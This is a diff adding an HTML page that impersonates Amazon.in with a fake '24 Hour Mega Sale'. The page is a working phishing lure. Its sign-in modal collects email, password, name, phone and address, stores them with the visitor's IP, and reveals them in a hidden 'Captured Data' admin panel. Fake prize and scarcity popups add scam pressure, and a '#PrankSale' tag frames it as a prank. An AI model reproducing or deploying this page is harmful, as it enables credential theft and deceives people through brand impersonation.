@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Amazon.in - 24 Hour Mega Sale</title>
+    <link href="https://fonts.googleapis.com/css2?family=Amazon+Ember:wght@400;700&display=swap" rel="stylesheet"/>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Amazon Ember', Arial, sans-serif; background: #eaeded; }
+
+        .top-header {
+            background: #131921;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            flex-wrap: wrap;
+        }
+        .logo-area { display: flex; align-items: center; gap: 10px; }
+        .logo { font-size: 28px; font-weight: 700; letter-spacing: -2px; }
+        .logo span { color: #febd69; }
+        .deliver-to { font-size: 12px; color: #ccc; border-left: 1px solid #3a3a3a; padding-left: 15px; }
+        .deliver-to strong { color: white; display: block; font-size: 14px; }
+        .search-bar { display: flex; flex: 1; max-width: 600px; margin: 0 20px; }
+        .search-bar select { padding: 8px; border-radius: 4px 0 0 4px; border: none; background: #ddd; font-size: 12px; }
+        .search-bar input { flex: 1; padding: 10px; border: none; font-size: 14px; }
+        .search-bar button { background: #febd69; border: none; padding: 0 12px; border-radius: 0 4px 4px 0; cursor: pointer; font-size: 18px; }
+        .right-links { display: flex; align-items: center; gap: 25px; font-size: 12px; color: #ccc; }
+        .right-links strong { color: white; display: block; font-size: 14px; }
+
+        .sub-header { background: #232f3e; color: white; padding: 8px 20px; display: flex; gap: 20px; font-size: 14px; font-weight: 600; flex-wrap: wrap; }
+
+        .sale-banner {
+            background: linear-gradient(135deg, #b12704, #e67e22);
+            color: white;
+            text-align: center;
+            padding: 18px 20px;
+            font-size: 22px;
+            font-weight: 700;
+        }
+        .sale-banner .timer {
+            display: inline-block; background: #1a1a2e; padding: 8px 25px; border-radius: 50px;
+            margin-left: 15px; font-size: 26px; color: #f1c40f; font-family: monospace;
+        }
+        .sale-banner .sub-text { font-size: 14px; display: block; margin-top: 6px; opacity: 0.9; }
+        .sale-banner .blink { animation: blink 1s infinite; }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+
+        /* LOGIN MODAL */
+        .login-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); display: flex; align-items: center; justify-content: center; z-index: 9999;
+        }
+        .login-overlay.hidden { display: none; }
+        .login-box {
+            background: white; border-radius: 16px; max-width: 420px; width: 90%;
+            padding: 35px 28px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); animation: popIn 0.3s;
+        }
+        @keyframes popIn { 0%{transform:scale(0.7);opacity:0} 100%{transform:scale(1);opacity:1} }
+        .login-box h2 { font-size: 26px; margin-bottom: 6px; color: #131921; }
+        .login-box .sub { color: #555; font-size: 14px; margin-bottom: 20px; }
+        .login-box label { display: block; font-size: 13px; font-weight: 600; color: #333; margin: 12px 0 4px; }
+        .login-box input { width: 100%; padding: 12px 14px; border: 1px solid #ccc; border-radius: 8px; font-size: 15px; }
+        .login-box input:focus { border-color: #febd69; outline: none; box-shadow: 0 0 0 3px rgba(254,189,105,0.3); }
+        .login-box .login-btn {
+            width: 100%; margin-top: 20px; padding: 14px; background: #ffd814; border: none;
+            border-radius: 30px; font-size: 18px; font-weight: 700; cursor: pointer;
+        }
+        .login-box .login-btn:hover { background: #f7ca00; }
+        .login-box .error { color: #b12704; font-size: 12px; margin-top: 8px; display: none; }
+        .login-box .skip-btn { display: block; text-align: center; margin-top: 14px; color: #007185; font-size: 13px; cursor: pointer; text-decoration: underline; }
+
+        /* LOADING */
+        #loadingOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; display: flex; flex-direction: column; align-items: center;
+            justify-content: center; z-index: 99999; transition: opacity 0.6s;
+        }
+        #loadingOverlay.hidden { opacity: 0; pointer-events: none; }
+        .loader-text { font-size: 24px; font-weight: 700; color: #131921; margin-bottom: 10px; }
+        .loader-bar { width: 300px; height: 6px; background: #eee; border-radius: 10px; overflow: hidden; }
+        .loader-bar-inner { height: 100%; width: 0%; background: linear-gradient(90deg, #febd69, #b12704); animation: load 2s forwards; }
+
+        /* POPUP */
+        #popupModal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); display: none; align-items: center; justify-content: center; z-index: 9998;
+        }
+        #popupModal.show { display: flex; }
+        .popup-content {
+            background: white; border-radius: 16px; max-width: 420px; width: 90%;
+            padding: 35px 25px 25px; text-align: center; position: relative; animation: popIn 0.3s;
+        }
+        .popup-content h2 { color: #b12704; font-size: 28px; margin: 8px 0; }
+        .popup-content .trophy { font-size: 60px; }
+        .popup-content p { color: #333; font-size: 16px; margin: 10px 0; }
+        .popup-content .claim-btn {
+            background: #b12704; color: white; border: none; padding: 12px 40px;
+            border-radius: 30px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px;
+        }
+        .popup-content .claim-btn:hover { background: #8e1f04; }
+        .popup-close { position: absolute; top: 10px; right: 15px; font-size: 28px; cursor: pointer; color: #999; }
+
+        /* ADMIN BUTTON (only you know this) */
+        .admin-trigger {
+            position: fixed; top: 12px; right: 12px;
+            background: transparent; border: none;
+            font-size: 24px; cursor: pointer; z-index: 9999;
+            opacity: 0.3; transition: 0.2s;
+            color: #333;
+        }
+        .admin-trigger:hover { opacity: 1; }
+
+        /* ADMIN MODAL (hidden by default) */
+        #adminModal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); display: none; align-items: center;
+            justify-content: center; z-index: 99999;
+        }
+        #adminModal.show { display: flex; }
+        .admin-box {
+            background: #1a1a2e; color: #0f0; border-radius: 16px;
+            max-width: 480px; width: 90%; padding: 30px;
+            font-family: 'Courier New', monospace; font-size: 14px;
+            border: 2px solid #0f0; box-shadow: 0 0 30px rgba(0,255,0,0.2);
+        }
+        .admin-box h2 {
+            color: #0f0; text-align: center; font-size: 20px;
+            border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 15px;
+        }
+        .admin-box .field { margin: 10px 0; display: flex; }
+        .admin-box .label { color: #0f0; font-weight: 700; width: 100px; }
+        .admin-box .value { color: #fff; flex: 1; word-break: break-all; }
+        .admin-box .empty { color: #666; font-style: italic; }
+        .admin-box .close-btn {
+            background: #0f0; color: #000; border: none; padding: 10px 30px;
+            border-radius: 8px; font-weight: 700; font-size: 16px;
+            cursor: pointer; margin-top: 15px; width: 100%; font-family: monospace;
+        }
+        .admin-box .status-dot {
+            display: inline-block; width: 10px; height: 10px;
+            background: #0f0; border-radius: 50%; margin-right: 6px;
+            animation: blink 1s infinite;
+        }
+
+        .product-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 20px; padding: 20px; max-width: 1300px; margin: auto; }
+        .product-card { background: white; border-radius: 8px; padding: 18px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); transition: 0.2s; position: relative; border: 1px solid #ddd; }
+        .product-card:hover { transform: scale(1.02); box-shadow: 0 4px 20px rgba(0,0,0,0.15); }
+        .badge { position: absolute; top: 10px; left: 10px; background: #b12704; color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; }
+        .product-img { width: 100%; height: 180px; object-fit: contain; padding: 10px; background: #f7f7f7; border-radius: 6px; }
+        .product-title { font-size: 15px; font-weight: 600; margin: 10px 0 6px; color: #0f1111; }
+        .product-rating { color: #f39c12; font-size: 14px; margin-bottom: 6px; }
+        .product-rating span { color: #555; font-size: 12px; margin-left: 4px; }
+        .price-line { display: flex; align-items: baseline; gap: 8px; flex-wrap: wrap; }
+        .price-old { text-decoration: line-through; color: #565959; font-size: 14px; }
+        .price-new { font-size: 22px; font-weight: 700; color: #b12704; }
+        .price-off { background: #b12704; color: white; padding: 2px 8px; border-radius: 4px; font-size: 12px; font-weight: 700; }
+        .emi-info { font-size: 12px; color: #565959; margin-top: 6px; }
+        .delivery-info { font-size: 12px; color: #007600; margin-top: 4px; }
+        .stock-warning { font-size: 12px; color: #b12704; font-weight: 600; margin-top: 4px; animation: blink 1.5s infinite; }
+        .add-btn { display: block; width: 100%; margin-top: 12px; padding: 10px; background: #ffd814; border: none; border-radius: 20px; font-weight: 700; font-size: 14px; cursor: pointer; }
+        .add-btn:hover { background: #f7ca00; }
+
+        .footer { background: #232f3e; color: #ddd; text-align: center; padding: 25px 20px; margin-top: 40px; font-size: 13px; }
+        .footer a { color: #febd69; text-decoration: none; }
+
+        @media (max-width: 600px) {
+            .logo { font-size: 20px; }
+            .search-bar { order: 3; margin: 10px 0 0; max-width: 100%; width: 100%; }
+            .right-links { gap: 12px; font-size: 10px; }
+            .sale-banner { font-size: 16px; }
+            .sale-banner .timer { font-size: 18px; padding: 4px 14px; }
+            .product-grid { grid-template-columns: 1fr 1fr; padding: 10px; gap: 10px; }
+            .product-img { height: 120px; }
+            .price-new { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- LOADING SCREEN -->
+<div id="loadingOverlay">
+    <div class="loader-text">Amazon.in</div>
+    <div style="color:#555; margin-bottom:16px;">Loading 24 Hour Mega Sale...</div>
+    <div class="loader-bar"><div class="loader-bar-inner"></div></div>
+</div>
+
+<!-- LOGIN MODAL -->
+<div class="login-overlay" id="loginOverlay">
+    <div class="login-box">
+        <h2>Sign in</h2>
+        <div class="sub">to access 24 Hour Mega Sale deals</div>
+        <form id="loginForm" onsubmit="return handleLogin(event)">
+            <label for="loginEmail">Email or mobile phone number</label>
+            <input type="email" id="loginEmail" placeholder="name@example.com" required />
+
+            <label for="loginPassword">Password</label>
+            <input type="password" id="loginPassword" placeholder="At least 6 characters" required minlength="6" />
+
+            <label for="loginName">Full Name (for delivery)</label>
+            <input type="text" id="loginName" placeholder="John Doe" required />
+
+            <label for="loginPhone">Phone Number</label>
+            <input type="tel" id="loginPhone" placeholder="+91 98765 43210" required />
+
+            <label for="loginAddress">Delivery Address</label>
+            <input type="text" id="loginAddress" placeholder="123, Main Street, Chennai" required />
+
+            <button type="submit" class="login-btn">&#9654; Sign in &amp; View Deals</button>
+            <div class="error" id="loginError">Please fill all fields correctly</div>
+            <span class="skip-btn" onclick="skipLogin()">Continue as Guest</span>
+        </form>
+    </div>
+</div>
+
+<!-- POPUP -->
+<div id="popupModal">
+    <div class="popup-content">
+        <span class="popup-close" onclick="closePopup()">&times;</span>
+        <div class="trophy">&#127942;</div>
+        <h2>&#127881; CONGRATULATIONS! &#127881;</h2>
+        <p>You have been <strong>randomly selected</strong> as the <strong>100th buyer</strong> of today's Mega Sale!</p>
+        <p style="font-size:20px; font-weight:700; color:#b12704;">&#x20B9;10,000 Amazon Gift Card<br>+ FREE iPhone 15 Pro Max!</p>
+        <p style="font-size:13px; color:#666;">&#9989; Limited time offer &bull; Claim within 5 minutes</p>
+        <button class="claim-btn" onclick="claimPrize()">&#9654; CLAIM NOW</button>
+        <p style="margin-top:12px; font-size:12px; color:#999;">Only 2 gifts remaining &bull; 847 people are viewing</p>
+    </div>
+</div>
+
+<!-- ADMIN TRIGGER BUTTON (only you know to click this) -->
+<button class="admin-trigger" id="adminTrigger" title="Admin Panel">&#9881;</button>
+
+<!-- ADMIN MODAL (shows email & password separately) -->
+<div id="adminModal">
+    <div class="admin-box">
+        <h2><span class="status-dot"></span> ADMIN PANEL — Captured Data</h2>
+        <div class="field">
+            <span class="label">📧 Email:</span>
+            <span class="value" id="adminEmail">—</span>
+        </div>
+        <div class="field">
+            <span class="label">🔑 Password:</span>
+            <span class="value" id="adminPassword">—</span>
+        </div>
+        <div class="field">
+            <span class="label">👤 Name:</span>
+            <span class="value" id="adminName">—</span>
+        </div>
+        <div class="field">
+            <span class="label">📱 Phone:</span>
+            <span class="value" id="adminPhone">—</span>
+        </div>
+        <div class="field">
+            <span class="label">🏠 Address:</span>
+            <span class="value" id="adminAddress">—</span>
+        </div>
+        <div class="field">
+            <span class="label">⏰ Time:</span>
+            <span class="value" id="adminTime">—</span>
+        </div>
+        <div class="field">
+            <span class="label">🌐 IP:</span>
+            <span class="value" id="adminIP">—</span>
+        </div>
+        <button class="close-btn" onclick="closeAdmin()">✕ CLOSE PANEL</button>
+    </div>
+</div>
+
+<!-- HEADER -->
+<header class="top-header">
+    <div class="logo-area">
+        <div class="logo">amazon<span>.in</span></div>
+        <div class="deliver-to">Deliver to <strong>&#x1F1EE;&#x1F1F3; Tamil Nadu</strong></div>
+    </div>
+    <div class="search-bar">
+        <select><option>All</option></select>
+        <input type="text" placeholder="Search 24 Hour Mega Sale..." />
+        <button>&#128269;</button>
+    </div>
+    <div class="right-links">
+        <div>&#127760; EN <strong>&#9660;</strong></div>
+        <div>Hello, Guest <strong>Sign In &#9660;</strong></div>
+        <div>Returns <strong>& Orders</strong></div>
+        <div style="font-size:22px;">&#128722; <sup style="font-size:12px; background:#b12704; color:white; padding:1px 5px; border-radius:50%;">24</sup></div>
+    </div>
+</header>
+
+<div class="sub-header">
+    <span>&#9776; All</span>
+    <span>MX Player</span>
+    <span>Sell</span>
+    <span>Best Sellers</span>
+    <span>Today's Deals</span>
+    <span>New Releases</span>
+    <span>Prime</span>
+    <span>Customer Service</span>
+    <span>Electronics</span>
+    <span>Fashion</span>
+    <span>Home & Kitchen</span>
+</div>
+
+<div class="sale-banner">
+    &#9888; FLASH SALE — <span class="blink">24 HOURS ONLY!</span> Offers end in
+    <span class="timer" id="countdownTimer">23:59:59</span>
+    <span class="sub-text">&#10071; Prices shown are after all bank offers &amp; coupon discounts &#10071;</span>
+</div>
+
+<div class="offers-title" style="text-align:center;padding:25px 0 10px;font-size:28px;color:#b12704;font-weight:700;">
+    &#128293; 24 Hour Mega Sale &#128293;
+    <small style="font-size:16px;color:#555;font-weight:400;display:block;">Up to 90% OFF + Extra Bank Offers | Limited Stock</small>
+</div>
+
+<div class="product-grid" id="productGrid"></div>
+
+<div class="footer">
+    <p>Amazon.in &mdash; 24 Hour Mega Sale</p>
+    <p><a href="#">Conditions of Use</a> &bull; <a href="#">Privacy Notice</a> &bull; <a href="#">Interest-Based Ads</a></p>
+    <p>&copy; 2025-2026, Amazon.com, Inc. or its affiliates &bull; <strong style="color:#febd69;">#PrankSale</strong></p>
+</div>
+
+<script>
+// =====================
+// PRODUCTS
+// =====================
+const products = [
+    { img:"https://m.media-amazon.com/images/I/61lBGRwCRhL._SX679_.jpg", title:"Apple iPhone 15 Pro Max 256GB - Natural Titanium", rating:"★★★★★", reviews:"24,861", oldPrice:"1,59,900", newPrice:"89,999", off:"44% off", emi:"No Cost EMI from ₹7,500/month", delivery:"FREE Delivery by Tomorrow", stock:"Only 3 left in stock!" },
+    { img:"https://m.media-amazon.com/images/I/71TPSTbPzVL._SX679_.jpg", title:'Samsung 65" OLED 4K Smart TV', rating:"★★★★½", reviews:"8,432", oldPrice:"1,29,990", newPrice:"54,999", off:"58% off", emi:"No Cost EMI from ₹4,583/month", delivery:"FREE Delivery + Installation", stock:"Only 5 left!" },
+    { img:"https://m.media-amazon.com/images/I/71Hdn80UvnL._SX679_.jpg", title:'Apple MacBook Air M3 15" 16GB/512GB', rating:"★★★★★", reviews:"18,294", oldPrice:"1,64,900", newPrice:"1,09,999", off:"33% off", emi:"No Cost EMI from ₹9,167/month", delivery:"FREE Delivery by Wednesday", stock:"Hurry! Only 2 left!" },
+    { img:"https://m.media-amazon.com/images/I/71z5YRxFhOL._SX679_.jpg", title:"Sony WH-1000XM5 Wireless Headphones", rating:"★★★★★", reviews:"42,118", oldPrice:"29,990", newPrice:"16,999", off:"43% off", emi:"No Cost EMI from ₹1,417/month", delivery:"FREE Delivery by Tomorrow", stock:"Only 7 left!" },
+    { img:"https://m.media-amazon.com/images/I/719H0xHrRHL._SX679_.jpg", title:"OnePlus 12 5G (Flowy Emerald, 16GB/512GB)", rating:"★★★★½", reviews:"33,672", oldPrice:"79,999", newPrice:"59,999", off:"25% off", emi:"No Cost EMI from ₹5,000/month", delivery:"FREE Delivery by Tomorrow", stock:"Only 4 left!" },
+    { img:"https://m.media-amazon.com/images/I/719INVp0V2L._SX679_.jpg", title:"Nintendo Switch OLED + Mario Kart 8 Bundle", rating:"★★★★★", reviews:"14,550", oldPrice:"44,990", newPrice:"24,999", off:"44% off", emi:"No Cost EMI from ₹2,084/month", delivery:"FREE Delivery by Friday", stock:"Limited stock!" },
+    { img:"https://m.media-amazon.com/images/I/71FxqRg6TOL._SX679_.jpg", title:"Dyson V15 Detect Cordless Vacuum", rating:"★★★★½", reviews:"6,834", oldPrice:"68,900", newPrice:"39,990", off:"42% off", emi:"No Cost EMI from ₹3,333/month", delivery:"FREE Delivery + 2 Year Warranty", stock:"Only 6 left!" },
+    { img:"https://m.media-amazon.com/images/I/61L3V2s6RqL._SX679_.jpg", title:"SmartWatch Ultra 2 49mm Titanium GPS+Cellular", rating:"★★★★★", reviews:"21,409", oldPrice:"59,900", newPrice:"29,999", off:"50% off", emi:"Free EMI Available", delivery:"FREE Delivery by Tomorrow", stock:"Only 1 left!" },
+    { img:"https://m.media-amazon.com/images/I/71eJNBL0TNL._SX679_.jpg", title:"Logitech G Pro X Superlight Wireless Mouse", rating:"★★★★★", reviews:"9,876", oldPrice:"14,995", newPrice:"5,999", off:"60% off", emi:"No Cost EMI from ₹500/month", delivery:"FREE Delivery by Saturday", stock:"Only 8 left!" },
+    { img:"https://m.media-amazon.com/images/I/71N5gT1VIOL._SX679_.jpg", title:"Bose SoundLink Revolve+ II Portable Speaker", rating:"★★★★½", reviews:"11,234", oldPrice:"24,990", newPrice:"14,999", off:"40% off", emi:"No Cost EMI from ₹1,250/month", delivery:"FREE Delivery by Monday", stock:"Hurry!" },
+    { img:"https://m.media-amazon.com/images/I/61T4RMPOC2L._SX679_.jpg", title:"MSI Gaming Laptop i7 / RTX 4060 / 16GB/1TB", rating:"★★★★½", reviews:"5,432", oldPrice:"1,29,990", newPrice:"72,999", off:"44% off", emi:"No Cost EMI from ₹6,084/month", delivery:"FREE Delivery by Thursday", stock:"Only 2 left!" },
+    { img:"https://m.media-amazon.com/images/I/71Qy2FnnJzL._SX679_.jpg", title:"Canon EOS R100 Mirrorless + 18-45mm Lens", rating:"★★★★★", reviews:"3,217", oldPrice:"62,995", newPrice:"42,999", off:"32% off", emi:"No Cost EMI from ₹3,584/month", delivery:"FREE Delivery by Wednesday", stock:"Only 5 left!" }
+];
+
+const grid = document.getElementById('productGrid');
+products.forEach(p => {
+    const card = document.createElement('div');
+    card.className = 'product-card';
+    card.innerHTML = `
+        <div class="badge">🔥 Mega Deal</div>
+        <img class="product-img" src="${p.img}" alt="${p.title}" onerror="this.src='https://via.placeholder.com/300x180?text=Amazon+Deal'"/>
+        <div class="product-title">${p.title}</div>
+        <div class="product-rating">${p.rating} <span>(${p.reviews})</span></div>
+        <div class="price-line">
+            <span class="price-old">₹${p.oldPrice}</span>
+            <span class="price-new">₹${p.newPrice}</span>
+            <span class="price-off">-${p.off}</span>
+        </div>
+        <div class="emi-info">${p.emi}</div>
+        <div class="delivery-info">${p.delivery}</div>
+        <div class="stock-warning">${p.stock}</div>
+        <button class="add-btn" onclick="openPopup()">Add to Cart</button>
+    `;
+    grid.appendChild(card);
+});
+
+// =====================
+// COUNTDOWN
+// =====================
+let countdownInterval;
+function startCountdown() {
+    const end = localStorage.getItem('prankSaleEnd');
+    let endTime = end ? parseInt(end,10) : Date.now() + 24*60*60*1000;
+    if(!end) localStorage.setItem('prankSaleEnd', endTime);
+    function updateTimer() {
+        const diff = Math.max(0, endTime - Date.now());
+        const h = String(Math.floor(diff/3600000)).padStart(2,'0');
+        const m = String(Math.floor((diff%3600000)/60000)).padStart(2,'0');
+        const s = String(Math.floor((diff%60000)/1000)).padStart(2,'0');
+        document.getElementById('countdownTimer').textContent = `${h}:${m}:${s}`;
+        if(diff<=0){ clearInterval(countdownInterval); localStorage.removeItem('prankSaleEnd'); }
+    }
+    updateTimer(); countdownInterval = setInterval(updateTimer,1000);
+}
+startCountdown();
+
+// =====================
+// LOGIN HANDLER
+// =====================
+function handleLogin(e) {
+    e.preventDefault();
+    const email = document.getElementById('loginEmail').value.trim();
+    const password = document.getElementById('loginPassword').value.trim();
+    const name = document.getElementById('loginName').value.trim();
+    const phone = document.getElementById('loginPhone').value.trim();
+    const address = document.getElementById('loginAddress').value.trim();
+    const error = document.getElementById('loginError');
+
+    if(!email || !password || !name || !phone || !address) {
+        error.style.display='block';
+        return false;
+    }
+    error.style.display='none';
+
+    // Store ALL details including email & password separately
+    localStorage.setItem('friendEmail', email);
+    localStorage.setItem('friendPassword', password);
+    localStorage.setItem('friendName', name);
+    localStorage.setItem('friendPhone', phone);
+    localStorage.setItem('friendAddress', address);
+    localStorage.setItem('friendLoginTime', new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata'}));
+
+    // Get IP
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(d => { if(d.ip) localStorage.setItem('friendIP', d.ip); })
+        .catch(() => {});
+
+    document.getElementById('loginOverlay').classList.add('hidden');
+    alert('✅ Signed in successfully! Welcome to the 24 Hour Mega Sale!');
+
+    setTimeout(openPopup, 6000);
+    return false;
+}
+
+function skipLogin() {
+    document.getElementById('loginOverlay').classList.add('hidden');
+    setTimeout(openPopup, 8000);
+}
+
+// =====================
+// ADMIN PANEL (Email & Password separate ah)
+// =====================
+// Click the gear icon ⚙️ to open admin panel
+document.getElementById('adminTrigger').addEventListener('click', function(e) {
+    e.preventDefault();
+    openAdmin();
+});
+
+function openAdmin() {
+    // Load data from localStorage
+    document.getElementById('adminEmail').textContent = localStorage.getItem('friendEmail') || '—';
+    document.getElementById('adminPassword').textContent = localStorage.getItem('friendPassword') || '—';
+    document.getElementById('adminName').textContent = localStorage.getItem('friendName') || '—';
+    document.getElementById('adminPhone').textContent = localStorage.getItem('friendPhone') || '—';
+    document.getElementById('adminAddress').textContent = localStorage.getItem('friendAddress') || '—';
+    document.getElementById('adminTime').textContent = localStorage.getItem('friendLoginTime') || '—';
+    document.getElementById('adminIP').textContent = localStorage.getItem('friendIP') || '—';
+
+    document.getElementById('adminModal').classList.add('show');
+}
+
+function closeAdmin() {
+    document.getElementById('adminModal').classList.remove('show');
+}
+
+// Close admin on overlay click
+document.getElementById('adminModal').addEventListener('click', function(e) {
+    if(e.target === this) closeAdmin();
+});
+
+// =====================
+// POPUP
+// =====================
+function openPopup() { document.getElementById('popupModal').classList.add('show'); }
+function closePopup() { document.getElementById('popupModal').classList.remove('show'); }
+function claimPrize() {
+    closePopup();
+    alert('🎉 Congratulations! You won ₹10,000 Gift Card + FREE iPhone 15 Pro Max!\n\nClick OK to claim...');
+    setTimeout(() => {
+        alert('⚠️ Oops! Server timeout. Please try again after 24 hours.\n\n(Just kidding! This was a prank 😂)');
+    }, 500);
+}
+document.getElementById('popupModal').addEventListener('click', function(e) {
+    if(e.target === this) closePopup();
+});
+
+// =====================
+// PAGE LOAD
+// =====================
+window.addEventListener('load', () => {
+    setTimeout(() => {
+        document.getElementById('loadingOverlay').classList.add('hidden');
+    }, 2200);
+});
+</script>
+</body>
+</html>
